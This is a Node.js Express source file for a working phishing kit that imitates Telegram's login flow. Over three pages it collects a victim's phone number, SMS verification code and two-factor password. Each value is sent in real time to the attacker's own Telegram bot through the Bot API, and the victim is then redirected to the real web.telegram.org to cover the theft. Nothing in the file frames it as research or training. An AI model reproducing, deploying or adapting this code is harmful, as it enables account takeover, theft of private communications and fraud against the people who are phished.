const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TOKEN;
const TELEGRAM_CHAT_ID = process.env.CHAT_ID;

function sendToTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN) return;
  axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    chat_id: TELEGRAM_CHAT_ID,
    text: text
  }).catch(e => console.log(e.message));
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const sessions = {};

// ========== СТИЛИ ==========
const getStyle = () => `
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
  background: #0f0f0f;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 20px;
}

.card {
  background: #1f1f1f;
  border-radius: 28px;
  padding: 32px 24px;
  max-width: 400px;
  width: 100%;
  box-shadow: 0 8px 24px rgba(0,0,0,0.4);
  text-align: center;
}

.logo {
  text-align: center;
  margin-bottom: 24px;
}

.logo svg {
  width: 48px;
  height: 48px;
}

h2 {
  color: #fff;
  font-size: 24px;
  font-weight: 500;
  margin-bottom: 8px;
}

.sub {
  color: #888;
  font-size: 14px;
  margin-bottom: 28px;
}

input {
  width: 100%;
  padding: 14px 16px;
  background: #2a2a2a;
  border: none;
  border-radius: 14px;
  color: white;
  font-size: 16px;
  margin-bottom: 16px;
  outline: none;
  transition: 0.2s;
}

input:focus {
  background: #333;
}

button {
  width: 100%;
  padding: 14px;
  background: #2c7be5;
  border: none;
  border-radius: 14px;
  color: white;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  transition: 0.2s;
}

button:hover {
  background: #1a68d1;
}
`;

// ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ СТРАНИЦ ==========
const getPage = (title, subtitle, formAction, fields, hidden = {}) => {
  const fieldsHtml = fields.map(f => `<input type="${f.type}" name="${f.name}" placeholder="${f.placeholder}" required>`).join('');
  const hiddenHtml = Object.entries(hidden).map(([k, v]) => `<input type="hidden" name="${k}" value="${v}">`).join('');
  
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Telegram</title>
  <style>${getStyle()}</style>
</head>
<body>
  <div class="card">
    <div class="logo">
      <svg viewBox="0 0 24 24" fill="#2c7be5">
        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.66-.35-1.02.22-1.61.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.2-.04-.28-.02-.12.02-2.02 1.28-2.85 1.81-.27.18-.51.27-.73.27-.24 0-.7-.14-1.04-.25-.43-.15-.86-.33-1.23-.34-.41-.01-.82.1-1.2.3-.67.34-1.1.86-1.1 1.1 0 .34.48.68 1.23 1.04.75.36 1.71.74 2.23.78.53.04 1.07-.14 1.61-.53.86-.63 1.7-1.24 2.55-1.86.85-.62 1.69-1.23 2.55-1.85.86-.62 1.7-1.24 2.55-1.86.85-.62 1.69-1.23 2.55-1.85.86-.62 1.7-1.24 2.55-1.86.85-.62 1.69-1.23 2.55-1.85.86-.62 1.7-1.24 2.55-1.86.85-.62 1.69-1.23 2.55-1.85.86-.62 1.7-1.24 2.55-1.86.85-.62 1.69-1.23 2.55-1.85.86-.62 1.7-1.24 2.55-1.86z"/>
      </svg>
    </div>
    <h2>${title}</h2>
    <div class="sub">${subtitle}</div>
    <form action="${formAction}" method="post">
      ${hiddenHtml}
      ${fieldsHtml}
      <button type="submit">Next</button>
    </form>
  </div>
</body>
</html>`;
};

const getSuccessPage = () => `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Success</title>
  <style>${getStyle()}</style>
</head>
<body>
  <div class="card">
    <h2>Success</h2>
    <p>Redirecting to Telegram...</p>
    <script>setTimeout(() => { window.location = "https://web.telegram.org"; }, 2000);</script>
  </div>
</body>
</html>`;

const getErrorPage = (msg) => `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Error</title>
  <style>${getStyle()}</style>
</head>
<body>
  <div class="card">
    <h2>Error</h2>
    <p>${msg}</p>
    <button onclick="location.href='/'">Try Again</button>
  </div>
</body>
</html>`;

// ========== МАРШРУТЫ ==========
app.get('/', (req, res) => {
  res.send(getPage('Telegram', 'Sign in to your account', '/send-code', [
    { name: 'phone', placeholder: 'Phone number', type: 'tel' }
  ]));
});

app.post('/send-code', (req, res) => {
  const { phone } = req.body;
  const sessionId = Date.now().toString();
  sessions[sessionId] = { phone };
  sendToTelegram(`📞 PHONE: ${phone}`);
  res.send(getPage('Verification code', `We've sent a code to ${phone}`, '/verify-code', [
    { name: 'code', placeholder: 'Enter code', type: 'text' }
  ], { session: sessionId }));
});

app.post('/verify-code', (req, res) => {
  const { session, code } = req.body;
  const sessionData = sessions[session];
  if (!sessionData) return res.send(getErrorPage('Session expired. Please start over.'));

  sendToTelegram(`🔐 SMS CODE: ${code} | Phone: ${sessionData.phone}`);
  sessionData.code = code;

  res.send(getPage('Enter password', 'Your account has an additional password', '/submit-password', [
    { name: 'password', placeholder: 'Password', type: 'password' }
  ], { session }));
});

app.post('/submit-password', (req, res) => {
  const { session, password } = req.body;
  const sessionData = sessions[session];
  if (!sessionData) return res.send(getErrorPage('Session expired. Please start over.'));

  sendToTelegram(`🔐 2FA PASSWORD: ${password}\nPhone: ${sessionData.phone}\nCode: ${sessionData.code}`);
  delete sessions[session];

  res.send(getSuccessPage());
});

// Любые другие GET-запросы → на главную
app.get('*', (req, res) => {
  res.redirect('/');
});

app.listen(PORT, () => {
  console.log(`✅ Server running on http://localhost:${PORT}`);
});
